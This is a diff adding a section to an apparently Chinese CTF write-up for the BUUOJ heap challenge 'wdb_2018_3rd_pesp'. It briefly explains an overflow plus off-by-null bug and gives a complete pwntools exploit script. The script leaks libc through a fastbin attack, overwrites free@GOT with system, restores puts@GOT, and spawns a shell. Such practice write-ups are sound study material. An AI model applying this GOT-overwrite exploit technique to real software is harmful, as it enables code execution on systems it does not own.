@@ -953,5 +953,72 @@ def exp():
     p.interactive()
 exp()
 ```  
-## 0x25  
+## 0x25 wdb_2018_3rd_pesp  
+这个题比较简单，edit存在任意字节溢出，模仿ZJCTF那个题做，改chunk0的指针为free_got，然后改free_got为system，但是有一个需要注意的，edit还存在off by null，会把后面一个地址的低字节置0，而free_got下面就是put_got，这一波直接把puts_got改炸了，程序就挂了，所以要把puts_got复原  
+```python  
+#!/usr/bin/env python
+#coding=utf-8
+from pwn import*
+from LibcSearcher import *
+import sys
+context.log_level = 'debug'
+context.terminal = ['terminator','-x','sh','-c']
+binary = './wdb_2018_3rd_pesp' 
+local = 0
+if local == 1:
+    p=process(binary)
+else:
+    p=remote("node3.buuoj.cn",26391)
+elf=ELF(binary)
+libc=elf.libc
+def add(size,content):
+    p.recvuntil("choice:")
+    p.sendline("2")
+    p.recvuntil("name:")
+    p.sendline(str(size))
+    p.recvuntil("servant:")
+    p.sendline(content)
+def edit(index,size,content):
+    p.recvuntil("choice:")
+    p.sendline("3")
+    p.recvuntil("servant:")
+    p.sendline(str(index))
+    p.recvuntil("name:")
+    p.sendline(str(size))
+    p.recvuntil("servnat:")
+    p.sendline(content)
+def show():
+    p.recvuntil("choice:")
+    p.sendline("1")
+def free(index):
+    p.recvuntil("choice:")
+    p.sendline("4")
+    p.recvuntil("servant:")
+    p.sendline(str(index))
+def exp():
+    
+    add(0x60,"a"*0x20) # 0
+    add(0x60,"b"*0x20) # 1
+    add(0x60,"/bin/sh\x00") # 2
+    free(1)
+    payload = "a"*0x60 + p64(0) + p64(0x71) + p64(0x6020ad)
+    edit(0,len(payload),payload)
+    add(0x60,"a"*0x20)
+    payload = "a"*3 + p64(0x60) + p64(0x602018)
+    add(0x60,payload)
+    show()
+    addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
+    libc_base = addr - libc.symbols['free']
+    system = libc_base + libc.sym['system']
+    log.success("libc_base==>" + hex(libc_base))
+    log.success("system==>" + hex(system))
+    
+    payload = p64(system) + p64(libc_base + libc.sym['puts'])
+    edit(0,len(payload),payload)
+    free(2)
+    
+    p.interactive()
+exp()
+```  
+## 0x26  
 咕咕咕……  
